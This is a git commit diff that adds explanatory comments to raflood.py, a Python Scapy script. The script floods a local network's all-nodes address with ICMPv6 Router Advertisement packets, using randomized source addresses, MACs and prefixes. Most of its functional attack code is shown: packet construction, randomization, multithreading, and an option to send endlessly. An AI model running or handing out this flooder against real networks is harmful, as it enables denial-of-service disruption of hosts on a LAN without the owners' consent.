0c0908534579542a0d1bf4e0b477bd1015f0029e
ridolmethis <pleasestopemailingmeyourgoats@gmail.com>
2016-04-14 08:03:59 +1000

    update raflood.py to have comments

--- raflood.py
+++ raflood.py
@@ -7,44 +7,45 @@ import threading
 import sys
 
 try:
-    print sys.argv[3]
+    print sys.argv[3] #check if all arguments have been supplied
 except:
-    print 'usage:',sys.argv[0],' interface threads packets'
+    print 'usage:',sys.argv[0],' interface threads packets' #fail if not
     sys.exit(0)
-class RA_Flooder (threading.Thread):
+
+class RA_Flooder (threading.Thread): #worker class for threading
     def __init__(self, counter=0):
 		threading.Thread.__init__(self)
 		self.iface = sys.argv[1]
 		self.counter = counter
 
-    def prefix_pack(self):
+    def prefix_pack(self): #build the actual packet
 		self.pkt = ICMPv6NDOptPrefixInfo()
 		self.pkt.prefixlen = 64
 			#self.pkt.prefix = "cc5f::"
-		self.pkt.prefix = self.prefix_rand()
+		self.pkt.prefix = self.prefix_rand() #randomize prefix
 		#self.pkt.show()
 		return self.pkt
 
-    def ipv6_rand(self):
+    def ipv6_rand(self): #generate random ipv6 address
 		self.rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(4))
 		return 'fe80::' + self.rand
 
-    def prefix_rand(self):
+    def prefix_rand(self): #generate random ipv6 prefix
 		self.pre_rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(2))
-		return '2012:' + self.pre_rand + ':b304::' 
+		return '2012:' + self.pre_rand + ':b304::'
 
-    def mac_rand(self):
+    def mac_rand(self): #generate random mac address
 		self.mac = ':'.join('{:x}'.format(random.randint(0,2**8 - 1)) for i in range(6))
 		return str(self.mac)
 
     def packet_gen(self):
-
+        #build the actual packet in scapy
         self.a = IPv6()
-        self.a.dst = "ff02::1"
-        self.a.src = self.ipv6_rand()
+        self.a.dst = "ff02::1" #dst is set to broadcast
+        self.a.src = self.ipv6_rand() #the source is randomized
         self.a.nh = 58
 
-        self.b = ICMPv6ND_RA()
+        self.b = ICMPv6ND_RA() #set as router advertisment
         self.b.routerlifetime = 0
 
         self.c = ICMPv6NDOptSrcLLAddr()
@@ -61,12 +62,12 @@ class RA_Flooder (threading.Thread):
         return self.pk
 
     def run(self):
-        self.s = conf.L3socket()#iface=self.iface)
-        if self.counter is 0:
+        self.s = conf.L3socket()#iface=self.iface) #use correct interface
+        if self.counter is 0: #if the counter is zero, continue forever
             while True:
                 self.pkt = self.packet_gen()
                 self.s.send(self.pkt)
-        else:
+        else: #otherwise, use until packet count (per thread) has been met
             for x in range(self.counter):
                 self.pkt = self.packet_gen()
                 self.s.send(self.pkt)
@@ -75,7 +76,7 @@ class RA_Flooder (threading.Thread):
 threadLock = threading.Lock()
 threads = []
 
-for x in range(0, int(sys.argv[2])):
+for x in range(0, int(sys.argv[2])): #create threads
     t = RA_Flooder(int(sys.argv[3]))
     threads.append(t)
     print '[+] Thread started ' + str(x)
